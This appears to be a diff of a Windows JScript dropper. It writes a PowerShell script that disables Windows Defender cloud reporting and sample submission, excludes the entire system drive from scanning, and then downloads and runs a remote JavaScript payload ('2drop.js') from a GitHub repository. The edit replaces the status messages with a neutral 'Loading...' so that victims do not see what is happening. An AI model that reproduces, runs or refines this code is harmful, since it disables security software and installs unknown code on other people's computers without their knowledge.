@@ -13,13 +13,10 @@ var psPath = tempFolder + "\\" + psFilename;
 // PowerShell script content (robust with try/catch and readable output)
 var psContent =
 'try {\n' +
-'    Write-Output "Running Defender commands...";\n' +
+'    Write-Output "Loading...";\n' +
 '    Set-MpPreference -MAPSReporting 0;\n' +
-'    Write-Output "Set-MpPreference -MAPSReporting 0 -> OK";\n' +
 '    Set-MpPreference -SubmitSamplesConsent 2;\n' +
-'    Write-Output "Set-MpPreference -SubmitSamplesConsent 2 -> OK";\n' +
 '    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
-'    Write-Output ("Add-MpPreference -ExclusionPath " + $env:SystemDrive + " -> OK");\n' +
 '} catch {\n' +
 '    Write-Error ("ERROR: " + $_.Exception.Message);\n' +
 '}\n' +
@@ -27,7 +24,7 @@ var psContent =
 'Write-Output "Current settings (Get-MpPreference):";\n' +
 'Get-MpPreference | Select MAPSReporting, SubmitSamplesConsent, ExclusionPath | Format-List;\n' +
 '\n' +
-'$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/master/2drop.js";\n' +
+'$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/2drop.js";\n' +
 '$destination = "$env:TEMP\\main.js";\n' +
 'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
 'Start-Process $destination;\n' +
@@ -55,4 +52,5 @@ try {
 }
 // If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
 WScript.Quit(0);
+
 
